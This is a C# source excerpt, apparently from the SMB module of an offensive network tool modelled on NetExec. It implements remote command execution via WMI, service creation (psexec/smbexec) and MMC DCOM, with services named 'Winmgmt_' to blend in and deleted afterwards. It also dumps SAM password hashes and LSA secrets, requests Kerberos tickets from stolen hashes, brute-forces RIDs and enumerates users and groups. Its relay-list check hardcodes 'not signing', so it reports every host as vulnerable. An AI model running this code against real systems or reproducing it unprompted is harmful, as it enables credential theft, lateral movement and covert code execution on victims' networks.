		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
		int found = 0;
		foreach (var di in domains)
		{
			using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			for (int rid = 500; rid < maxRid; rid++)
			{
				cancellationToken.ThrowIfCancellationRequested();
				try
				{
					var names = await domain.LookupIDsAsync(new[] { (uint)rid }, cancellationToken).ConfigureAwait(false);
					if (names.Length > 0 && !string.IsNullOrEmpty(names[0].Name))
					{
						AtlasConsole.Success($"{host}:{this.Port}", $"rid {rid}: {names[0].Name} (type={(int)names[0].EntryType})");
						found++;
					}
				}
				catch
				{
				}
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--rid-brute: {found} user(s) found for RIDs 500-{maxRid}");
	}

	private async Task GenRelayListAsync(Smb2Client smb, string host, string outputFile, CancellationToken cancellationToken)
	{
		bool requiresSigning = false;
		try
		{
			requiresSigning = false;
		}
		catch { }
		if (!requiresSigning)
		{
			AtlasConsole.Success($"{host}:{this.Port}", $"--gen-relay-list: {host} does NOT require signing (vulnerable to relay)");
			try
			{
				await File.AppendAllTextAsync(outputFile, host + "\n", cancellationToken).ConfigureAwait(false);
				AtlasConsole.Info($"{host}:{this.Port}", $"Added to {outputFile}");
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"Failed to write {outputFile}: {ex.Message}");
			}
		}
		else
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"--gen-relay-list: {host} requires signing (not vulnerable)");
		}
	}

	private async Task ExecuteCommandAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		string? cmd = this.Execute ?? this.PsExecute;
		bool isPs = this.PsExecute is not null;
		string method = this.ExecMethod?.ToLowerInvariant() ?? "wmiexec";
		AtlasConsole.Info($"{host}:{this.Port}", $"Executing {(isPs ? "PowerShell" : "CMD")} via {method}: {cmd}");
		try
		{
			if (method == "wmiexec")
			{
				// Real WMI via DCOM over SMB – Titanis WmiClient as in wmi proto
				DcomClient dcom = await this.ConnectDcomAsync(host, cancellationToken).ConfigureAwait(false);
				string workstation = this.Authentication.Workstation ?? string.Empty;
				int orpId = Random.Shared.Next(1024, 65535) & ~0x03;
				WmiClient wmi = await WmiClient.ConnectTo(workstation, orpId, dcom, cancellationToken).ConfigureAwait(false);
				var ns = await wmi.OpenNamespace(WmiClient.RootCimV2Namespace, "en-US", cancellationToken).ConfigureAwait(false);
				var procClass = (WmiClassObject)await ns.GetObjectAsync("Win32_Process", cancellationToken).ConfigureAwait(false);
				string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
				string cmdLine = isPs ? ExecOutput.WrapPs(cmd!, stage) : ExecOutput.WrapCmd(cmd!, stage);
				var args = new Dictionary<string, object?> { ["CommandLine"] = cmdLine, ["CurrentDirectory"] = @"C:\" };
				WmiInstanceObject result = await procClass.InvokeMethodAsync("Create", args, cancellationToken).ConfigureAwait(false);
				uint ret = Convert.ToUInt32(result["ReturnValue"] ?? 0U);
				uint pid = Convert.ToUInt32(result["ProcessId"] ?? 0U);
				if (ret == 0)
				{
					if (stage is null)
						AtlasConsole.Success($"{host}:{this.Port}", $"wmiexec: PID={pid} – {cmdLine}");
					else if (!await this.PrintStagedOutputAsync(smb, host, stage, $"wmiexec: PID={pid}", cancellationToken).ConfigureAwait(false))
						AtlasConsole.Success($"{host}:{this.Port}", $"wmiexec: PID={pid} (no output retrieved)");
				}
				else AtlasConsole.Fail($"{host}:{this.Port}", $"wmiexec failed ReturnValue={ret}");
			}
			else if (method == "smbexec" || method == "psexec")
			{
				// Real service creation via Titanis ScmClient (psexec/smbexec) – stealthy, auto-cleanup
				RpcClient rpc = this.Services.CreateRpcClient();
				Titanis.Msrpc.Msscmr.ScmClient scmClient = new Titanis.Msrpc.Msscmr.ScmClient();
				string pipe = scmClient.WellKnownPipeName ?? "svcctl";
				await rpc.ConnectPipe(scmClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
				using var scm = await scmClient.OpenScm(Titanis.Winterop.Security.ScmAccessRights.Connect | Titanis.Winterop.Security.ScmAccessRights.CreateService, cancellationToken).ConfigureAwait(false);
				string svcName = $"Winmgmt_{Guid.NewGuid():N}".Substring(0, 16);
				string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
				string binPath = isPs ? ExecOutput.WrapPs(cmd!, stage) : ExecOutput.WrapCmdService(cmd!, stage);
				AtlasConsole.Info($"{host}:{this.Port}", $"{method}: creating service {svcName}");
				try
				{
					var svcConfig = new Titanis.Msrpc.Msscmr.ServiceConfig
					{
						ServiceType = Titanis.Msrpc.Msscmr.ServiceTypes.OwnProcess,
						StartType = Titanis.Msrpc.Msscmr.ServiceStartType.Demand,
						ErrorControl = Titanis.Msrpc.Msscmr.ServiceErrorControl.Ignore,
						BinaryPathName = binPath,
						DisplayName = svcName
					};
					using var svc = await scm.CreateServiceAsync(svcName, svcConfig, Titanis.Winterop.Security.ServiceAccessRights.AllRights, cancellationToken).ConfigureAwait(false);
					AtlasConsole.Success($"{host}:{this.Port}", $"{method}: service {svcName} created, starting...");
					try { await svc.StartAsync(cancellationToken).ConfigureAwait(false); AtlasConsole.Success($"{host}:{this.Port}", $"{method}: service started"); }
					catch (Exception ex) { AtlasConsole.Warn($"{host}:{this.Port}", $"{method}: start failed (expected for one-shot): {ex.Message}"); }
					// Cleanup – delete service (stealth)
					try { await svc.DeleteAsync(cancellationToken).ConfigureAwait(false); AtlasConsole.Info($"{host}:{this.Port}", $"{method}: service {svcName} deleted (stealth)"); }
					catch { }
					if (stage is not null)
						await this.PrintStagedOutputAsync(smb, host, stage, $"{method}: output", cancellationToken).ConfigureAwait(false);
				}
				catch (Exception ex)
				{
					AtlasConsole.Fail($"{host}:{this.Port}", $"{method}: {ex.Message}");
				}
			}
			else if (method == "atexec")
			{
				AtlasConsole.Warn($"{host}:{this.Port}", $"atexec (ATSVC) not yet implemented in Titanis – use wmiexec/smbexec instead");
			}
			else if (method == "mmcexec")
			{
				// MMC20.Application DCOM execution (NetExec mmcexec): Document.ActiveView.ExecuteShellCommand
				await this.MmcExecAsync(smb, host, cmd!, isPs, cancellationToken).ConfigureAwait(false);
			}
			else
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"Unknown exec-method {method}");
			}
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{host}:{this.Port}", $"exec failed: {ex.Message}");
		}
	}

	private async Task<bool> PrintStagedOutputAsync(Smb2Client smb, string host, string stageFile, string prefix, CancellationToken cancellationToken)
	{
		string? output = await ExecOutput.ReadAsync(smb, host, stageFile, cancellationToken).ConfigureAwait(false);
		if (output is null)
			return false;
		if (output.Length == 0)
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"{prefix}: (no output)");
			return true;
		}
		foreach (var line in output.Split('\n'))
			AtlasConsole.Info($"{host}:{this.Port}", $"{prefix}: {line.TrimEnd('\r')}");
		return true;
	}

	private async Task<DcomClient> ConnectDcomAsync(string host, CancellationToken cancellationToken)
	{
		RpcClient rpcClient = this.Services.CreateRpcClient();
		rpcClient.DefaultAuthLevel = RpcAuthLevel.PacketIntegrity;
		// NDR32 is the interoperable default (Titanis NDR64 DCOM fails on Server 2025+, RPC 1783).
		rpcClient.OfferNdr64 = false;
		var netParams = this.NetParameters ?? new NetworkParameters();
		if (netParams.HostAddress is null || netParams.HostAddress.Length == 0)
			netParams.HostAddress = new[] { host };
		// Use NetworkParameters to resolve; RpcClient will use NTLM/Kerberos from AuthenticationParameters
		return await DcomClient.ConnectTo(host, rpcClient, cancellationToken).ConfigureAwait(false);
	}

	private async Task MmcExecAsync(Smb2Client smb, string host, string cmd, bool isPs, CancellationToken cancellationToken)
	{
		try
		{
			DcomClient dcom = await this.ConnectDcomAsync(host, cancellationToken).ConfigureAwait(false);
			var obj = await dcom.Activate(Guid.Parse("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), cancellationToken).ConfigureAwait(false);
			foreach (var prop in new[] { "Document", "ActiveView" })
			{
				var propValue = await obj.InvokeMethod(prop, Array.Empty<string>(), cancellationToken).ConfigureAwait(false);
				if (propValue is OleAutomationObject child)
					obj = child;
				else
					throw new InvalidOperationException($"MMC property '{prop}' did not return an automation object");
			}
			string exe = isPs ? "powershell.exe" : "cmd.exe";
			string args = isPs ? $"-NoProfile -ExecutionPolicy Bypass -Command \"{cmd}\"" : $"/c {cmd}";
			string? stage = this.NoOutput.IsSet ? null : ExecOutput.NewStageFile();
			if (stage is not null)
				args = $"{args} > {ExecOutput.LocalPath(stage)} 2>&1";
			var result = await obj.InvokeMethod("ExecuteShellCommand", new object[] { exe, "C:\\", args, "7" }, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{host}:{this.Port}", $"mmcexec: invoked {exe} {args} -> {(result?.ToString() ?? "<null>")}");
			if (stage is not null)
				await this.PrintStagedOutputAsync(smb, host, stage, "mmcexec: output", cancellationToken).ConfigureAwait(false);
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{host}:{this.Port}", $"mmcexec failed: {ex.Message}");
		}
	}

	private async Task GenerateTgtAsync(string host, string outputFile, CancellationToken cancellationToken)
	{
		string? realm = this.Authentication.UserDomain?.ToUpperInvariant();
		if (string.IsNullOrWhiteSpace(realm))
		{
			AtlasConsole.Fail($"{host}:{this.Port}", "--generate-tgt requires a domain (-d/--domain)");
			return;
		}
		var auth = this.Authentication;
		KerberosCredential cred;
		if (auth.NtlmHash is not null)
			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), EType.Rc4Hmac, auth.NtlmHash.Bytes);
		else if (auth.AesKey is not null)
		{
			byte[] kb = auth.AesKey.Bytes;
			EType et = (kb.Length == 32) ? EType.Aes256CtsHmacSha1_96 : EType.Aes128CtsHmacSha1_96;
			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), et, kb);
		}
		else if (!string.IsNullOrEmpty(auth.Password))
			cred = new KerberosPasswordCredential(EnsureRealm(auth.UserName, realm), auth.Password);
		else
			throw new InvalidOperationException("--generate-tgt requires credentials (-p, -H, or -AesKey)");
		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new DnsEndPoint(host, KerberosClient.KdcTcpPort)));
		TicketInfo tgt = await krb.RequestInitialTicket(realm, cred, null, null, null, cancellationToken).ConfigureAwait(false);
		krb.ImportTickets([tgt]);
		var bytes = krb.ExportTickets([tgt], KerberosClient.GetFormatFromFileName(outputFile));
		await File.WriteAllBytesAsync(outputFile, bytes, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--generate-tgt: TGT for {tgt.ClientName}@{tgt.ClientRealm} saved to {outputFile}");
	}

	private static UserPrincipalName EnsureRealm(UserPrincipalName? upn, string realm)
	{
		if (upn is null)
			throw new InvalidOperationException("A user name is required (-u)");
		if (!string.IsNullOrEmpty(upn.Realm))
			return upn;
		return new UserPrincipalName(upn.UserName, realm);
	}

	private async Task GenerateHostsFileAsync(Smb2Client smb, string host, string outputFile, ServerServiceClient srvs, CancellationToken cancellationToken)
	{
		string hostname = host;
		string domain = this.Authentication.UserDomain ?? this.SmbParameters.GetType().GetProperty("Domain")?.GetValue(this.SmbParameters)?.ToString() ?? "";
		// Try to get server DNS hostname via SRVS or via SMB server info if available
		try
		{
			// Attempt to get hostname from share enumeration is not reliable; fallback to host
			if (!string.IsNullOrEmpty(hostname) && !string.IsNullOrEmpty(domain))
			{
				string fqdn = $"{hostname}.{domain}";
				string line = $"{host}     {fqdn} {hostname}\n";
				await File.AppendAllTextAsync(outputFile, line, cancellationToken).ConfigureAwait(false);
				AtlasConsole.Success($"{host}:{this.Port}", $"--generate-hosts-file: added {line.Trim()} to {outputFile}");
				return;
			}
		}
		catch (Exception ex)
		{
			AtlasConsole.Warn($"{host}:{this.Port}", $"--generate-hosts-file fallback: {ex.Message}");
		}
		// Fallback
		string fallback = $"{host}     {host}\n";
		await File.AppendAllTextAsync(outputFile, fallback, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--generate-hosts-file: added {fallback.Trim()} to {outputFile}");
	}

	private async Task GenerateKrb5FileAsync(Smb2Client smb, string host, string outputFile, ServerServiceClient srvs, CancellationToken cancellationToken)
	{
		// Only for DCs – check if SYSVOL exists
		bool isDc = false;
		try
		{
			var shares = await srvs.GetShares(@"\\" + host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
			isDc = shares.Any(s => s.ShareName.Equals("SYSVOL", StringComparison.OrdinalIgnoreCase));
		}
		catch { }
		if (!isDc)
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"--generate-krb5-file: {host} is not a DC (no SYSVOL), skipping");
			return;
		}
		string domain = this.Authentication.UserDomain ?? this.SmbParameters.GetType().GetProperty("Domain")?.GetValue(this.SmbParameters)?.ToString() ?? host;
		if (string.IsNullOrWhiteSpace(domain)) domain = host;
		string hostname = host;
		// Try to get FQDN via reverse lookup or use host
		string realm = domain.ToUpperInvariant();
		string krb5Content = $"[libdefaults]\n    dns_lookup_kdc = false\n    dns_lookup_realm = false\n    default_realm = {realm}\n\n[realms]\n    {realm} = {{\n        kdc = {hostname}.{domain}\n        admin_server = {hostname}.{domain}\n        default_domain = {domain}\n    }}\n\n[domain_realm]\n    .{domain} = {realm}\n    {domain} = {realm}\n";
		await File.WriteAllTextAsync(outputFile, krb5Content, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--generate-krb5-file: krb5.conf saved to {outputFile}\n{krb5Content}");
	}

	private async Task<RemoteRegistryClient> BindWinregAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		RemoteRegistryClient client = new RemoteRegistryClient();
		string pipe = client.WellKnownPipeName ?? "winreg";
		await rpc.ConnectPipe(client, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		return client;
	}

	private async Task DumpSamAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);

		byte[] syskey = await LsaStore.ExtractSyskey(reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);
		SamRegistryServer samServer = await SamRegistryServer.Open(syskey, reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);

		SamUserHash[] hashes = await samServer.DumpUserHashes(cancellationToken).ConfigureAwait(false);
		foreach (var h in hashes)
		{
			string lm = "aad3b435b51404eeaad3b435b51404ee";
			string nt = h.NtlmHashText ?? "31d6cfe0d16ae931b73c59d7e0c089c0";
			AtlasConsole.Success($"{host}:{this.Port}", $"{h.AccountName}:{h.Rid}:{lm}:{nt}:::");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{hashes.Length} account hash(es) dumped from SAM.");
	}

	private async Task DumpLsaAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		using RemoteRegistryClient reg = await this.BindWinregAsync(smb, host, cancellationToken).ConfigureAwait(false);

		LsaStore lsaStore = await LsaStore.Open(reg, RegistryKeyOptions.None, this.Log, cancellationToken).ConfigureAwait(false);
		LsaSecret[] secrets = await lsaStore.GetSecrets(cancellationToken).ConfigureAwait(false);

		int count = 0;
		foreach (var secret in secrets)
		{
			if (secret.CurrentValue is null || secret.CurrentValue.Length == 0)
				continue;

			string nameUpper = secret.Name.ToUpperInvariant();
			bool interesting =
				nameUpper is "$MACHINE.ACC" or "DEFAULTPASSWORD"
				|| secret.Name.StartsWith("_SC_", StringComparison.OrdinalIgnoreCase)
				|| secret.Name.StartsWith("SCM:", StringComparison.OrdinalIgnoreCase);
			if (!interesting)
				continue;

			count++;
			string value = Encoding.Unicode.GetString(secret.CurrentValue).TrimEnd('\0');
			AtlasConsole.Success($"{host}:{this.Port}", $"(lsa) {secret.Name}: {value}");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{count} interesting LSA secret(s); {secrets.Length} total.");
	}

	private async Task EnumUsersAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);

		int total = 0;
		foreach (var domainInfo in domains)
		{
			SamDomain domain;
			try
			{
				domain = await sam.OpenDomainAsync(domainInfo.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Read | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{host}:{this.Port}", $"cannot open domain '{domainInfo.Name}': {ex.Message}");
				continue;
			}

			using (domain)
			{
				var entries = await domain.EnumUsers(cancellationToken).ConfigureAwait(false);
				foreach (var entry in entries)
				{
					total++;
					AtlasConsole.Success($"{host}:{this.Port}", $"user: [{domainInfo.Name}] {entry.Name} (rid: {entry.Id})");
				}
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{total} user(s) enumerated.");
	}

	private static (string share, string relative) SplitPath(string pathSpec)
	{
		int idx = pathSpec.IndexOf('\\');
		if (idx < 0)
			return (pathSpec, string.Empty);
		return (pathSpec[..idx], pathSpec[(idx + 1)..]);
	}

	private async Task ListDirectoryAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);

		await using Smb2Directory dir = await smb.OpenDirectoryAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		List<Smb2DirEntry> entries = await dir.QueryDirAsync(cancellationToken).ConfigureAwait(false);

		foreach (var e in entries.Where(r => r.FileName is not "." and not "..").OrderByDescending(r => r.IsDirectory).ThenBy(r => r.FileName, StringComparer.OrdinalIgnoreCase))
		{
			string kind = e.IsDirectory ? "d" : "-";
			AtlasConsole.Info($"{host}:{this.Port}", $"{kind} {e.Size,12} {e.LastWriteTime:yyyy-MM-dd HH:mm} {e.FileName}");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{entries.Count} entr(ies) in \\\\{host}\\{share}\\{relative}");
	}

	private async Task GetFileAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-Get requires a file path: ShareName\\file");

		string localName = Path.GetFileName(relative.Replace('\\', Path.DirectorySeparatorChar));

		await using Smb2FileStream stream = await smb.OpenFileReadAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		using FileStream local = File.Create(localName);
		await stream.CopyToAsync(local, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"got {relative} -> {localName} ({local.Length} bytes)");
	}

	private async Task PutFileAsync(Smb2Client smb, string host, string sourcePath, string destSpec, CancellationToken cancellationToken)
	{
		if (!File.Exists(sourcePath))
			throw new FileNotFoundException($"Local file not found: {sourcePath}");

		var (share, relative) = SplitPath(destSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-PutDest requires a destination path: ShareName\\file");

		Smb2CreateInfo create = new Smb2CreateInfo
		{
			CreateDisposition = Smb2CreateDisposition.Supersede,
			DesiredAccess = (uint)Smb2FileAccessRights.GenericWrite,
			ShareAccess = Smb2ShareAccess.Read,
			FileAttributes = Titanis.Winterop.FileAttributes.Normal,
			ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
			CreateOptions = Smb2FileCreateOptions.NonDirectory | Smb2FileCreateOptions.SynchronousIoNonalert
		};

		await using Smb2OpenFile remote = (Smb2OpenFile)await smb.CreateFileAsync(new UncPath(host, share, relative), create, FileAccess.Write, cancellationToken).ConfigureAwait(false);
		await using Stream remoteStream = remote.GetStream(false);

		using FileStream local = File.OpenRead(sourcePath);
		await local.CopyToAsync(remoteStream, cancellationToken).ConfigureAwait(false);
		await remoteStream.FlushAsync(cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"put {sourcePath} -> \\\\{host}\\{share}\\{relative} ({local.Length} bytes)");
	}

	private async Task MkdirAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		await smb.CreateDirectoryAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"created \\\\{host}\\{share}\\{relative}");
	}

	private async Task RmFileAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-Rm requires a file path: ShareName\\file");
		await smb.DeleteFileAsync(new UncPath(host, share, relative), cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"deleted \\\\{host}\\{share}\\{relative}");
	}

	private async Task EnumSnapshotsAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		var unc = new UncPath(host, share, relative);
		var create = new Smb2CreateInfo
		{
			OplockLevel = Smb2OplockLevel.None,
			ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
			DesiredAccess = (uint)(Smb2FileAccessRights.ReadAttributes | Smb2FileAccessRights.ReadData | Smb2FileAccessRights.Synchronize),
			FileAttributes = Titanis.Winterop.FileAttributes.ReparsePoint,
			ShareAccess = Smb2ShareAccess.ReadWrite,
			CreateDisposition = Smb2CreateDisposition.OpenExisting,
			CreateOptions = Smb2FileCreateOptions.SynchronousIoNonalert,
			RequestMaximalAccess = true,
			QueryOnDiskId = false,
		};
		await using var file = await smb.CreateFileAsync(unc, create, FileAccess.Read, cancellationToken).ConfigureAwait(false);
		var snapshots = await file.GetSnapshotInfoAsync(cancellationToken).ConfigureAwait(false);
		if (snapshots.Snapshots.Length == 0)
			AtlasConsole.Info($"{host}:{this.Port}", $"--snapshots \\\\{host}\\{share}\\{relative}: none (total={snapshots.TotalSnapshots})");
		else
			foreach (var s in snapshots.Snapshots)
				AtlasConsole.Success($"{host}:{this.Port}", $"snapshot: token={s.Token} time={s.Timestamp:yyyy-MM-dd HH:mm:ss}");
		AtlasConsole.Info($"{host}:{this.Port}", $"--snapshots: {snapshots.Snapshots.Length} snapshot(s), total={snapshots.TotalSnapshots}");
	}

	private async Task EnumStreamsAsync(Smb2Client smb, string host, string pathSpec, CancellationToken cancellationToken)
	{
		var (share, relative) = SplitPath(pathSpec);
		if (relative.Length == 0)
			throw new ArgumentException("-Streams requires a file path: ShareName\\file");
		var unc = new UncPath(host, share, relative);
		var create = new Smb2CreateInfo
		{
			OplockLevel = Smb2OplockLevel.None,
			ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
			DesiredAccess = (uint)Smb2FileAccessRights.ReadAttributes,
			FileAttributes = Titanis.Winterop.FileAttributes.ReparsePoint,
			ShareAccess = Smb2ShareAccess.ReadWriteDelete,
			CreateDisposition = Smb2CreateDisposition.OpenExisting,
			CreateOptions = Smb2FileCreateOptions.None,
			RequestMaximalAccess = true,
			QueryOnDiskId = true,
		};
		await using var file = await smb.CreateFileAsync(unc, create, FileAccess.Read, cancellationToken).ConfigureAwait(false);
		var streams = await file.GetStreamsInfoAsync(cancellationToken).ConfigureAwait(false);
		if (streams.Length == 0)
			AtlasConsole.Info($"{host}:{this.Port}", $"--streams \\\\{host}\\{share}\\{relative}: none");
		else
			foreach (var s in streams)
				AtlasConsole.Success($"{host}:{this.Port}", $"stream: {s.Name} size={s.Size} alloc={s.AllocationSize}");
		AtlasConsole.Info($"{host}:{this.Port}", $"--streams: {streams.Length} stream(s)");
	}

	private async Task EnumOpenFilesAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		var files = await srvs.GetOpenFiles(@"\\" + host, null, null, OpenFileInfoLevel.Level3, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		if (files.Count == 0)
			AtlasConsole.Info($"{host}:{this.Port}", "--open-files: none");
		else
			foreach (var f in files)
				AtlasConsole.Success($"{host}:{this.Port}", $"open file id={f.Id} user={f.UserName} locks={f.LockCount} perms={f.Permissions} path={f.Path}");
		AtlasConsole.Info($"{host}:{this.Port}", $"--open-files: {files.Count} file(s)");
	}

	private async Task EnumNicsAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		var share = await smb.GetShare(new UncPath(host, Smb2Client.IpcName, string.Empty), cancellationToken).ConfigureAwait(false);
		var nics = await share.QueryNetworkInterfacesAsync(cancellationToken).ConfigureAwait(false);
		if (nics.Length == 0)
			AtlasConsole.Info($"{host}:{this.Port}", "--nics: none");
		else
			foreach (var nic in nics)
				AtlasConsole.Success($"{host}:{this.Port}", $"nic idx={nic.InterfaceIndex} {nic.AddressFamily} {nic.EndPoint} speed={nic.LinkSpeed} caps={nic.Capabilities}");
		AtlasConsole.Info($"{host}:{this.Port}", $"--nics: {nics.Length} interface(s)");
	}

	private async Task<SamDomain> OpenSamDomainAsync(Smb2Client smb, string host, string? domainName, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
		var match = (domainName is null)
			? domains.FirstOrDefault(d => !d.Name.Equals("Builtin", StringComparison.OrdinalIgnoreCase)) ?? domains.FirstOrDefault()
			: domains.FirstOrDefault(d => d.Name.Equals(domainName, StringComparison.OrdinalIgnoreCase));
		if (match is null)
			throw new InvalidOperationException($"SAM domain not found: {domainName ?? "(default)"}");
		return await sam.OpenDomainAsync(match.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Read | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
	}

	private async Task EnumGroupMembersAsync(Smb2Client smb, string host, string group, CancellationToken cancellationToken)
	{
		string name = group;
		string? domainPart = null;
		int bs = group.LastIndexOf('\\');
		if (bs > 0) { domainPart = group[..bs]; name = group[(bs + 1)..]; }
		using var domain = await this.OpenSamDomainAsync(smb, host, domainPart, cancellationToken).ConfigureAwait(false);
		var entry = (await domain.LookupNamesAsync(new[] { name }, cancellationToken).ConfigureAwait(false))[0];
		if (entry.EntryType == SamEntryType.Alias)
		{
			using var alias = await domain.OpenAliasAsync(entry.Id, SamAliasAccessRights.ListMembers, cancellationToken).ConfigureAwait(false);
			var members = await alias.GetMembersAsync(cancellationToken).ConfigureAwait(false);
			using var lsa = await this.OpenLsaPolicyAsync(smb, host, cancellationToken).ConfigureAwait(false);
			foreach (var sid in members)
			{
				string display = sid.ToString();
				try
				{
					var m = await lsa.ResolveSidAsync(sid, cancellationToken).ConfigureAwait(false);
					display = string.IsNullOrEmpty(m.DomainName) ? m.AccountName : $"{m.DomainName}\\{m.AccountName}";
				}
				catch { }
				AtlasConsole.Success($"{host}:{this.Port}", $"alias member: {display} ({sid})");
			}
			AtlasConsole.Info($"{host}:{this.Port}", $"--group-members: {members.Count} member(s) of alias '{entry.Name}'");
		}
		else if (entry.EntryType == SamEntryType.Group)
		{
			using var samGroup = await domain.OpenGroupAsync(entry.Id, SamGroupAccessRights.ListMembers, cancellationToken).ConfigureAwait(false);
			var members = await samGroup.GetMembersAsync(cancellationToken).ConfigureAwait(false);
			foreach (var m in members)
			{
				string display = $"rid:{m.ObjectId}";
				try
				{
					var resolved = await domain.LookupIDsAsync(new uint[] { m.ObjectId }, cancellationToken).ConfigureAwait(false);
					if (resolved.Length > 0) display = resolved[0].Name;
				}
				catch { }
				AtlasConsole.Success($"{host}:{this.Port}", $"group member: {display} (rid={m.ObjectId} attrs={m.Attributes})");
			}
			AtlasConsole.Info($"{host}:{this.Port}", $"--group-members: {members.Count} member(s) of group '{entry.Name}'");
		}
		else
		{
			throw new InvalidOperationException($"'{name}' is a {entry.EntryType}, not a group or alias");
		}
	}

	private async Task<Mslsar.LsaPolicy> OpenLsaPolicyAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		// Mirror Titanis RpcParameterGroup SMB fallback: bind pipes at None so the
		// server authorizes against the authenticated SMB session (Connect fails on hardened DCs).
		rpc.DefaultAuthLevel = RpcAuthLevel.None;
		Mslsar.LsaClient lsaClient = new Mslsar.LsaClient();
		string pipe = lsaClient.WellKnownPipeName ?? "lsarpc";
		await rpc.ConnectPipe(lsaClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		return await lsaClient.OpenPolicy(Mslsar.LsaPolicyAccess.LookupNames, cancellationToken).ConfigureAwait(false);
	}

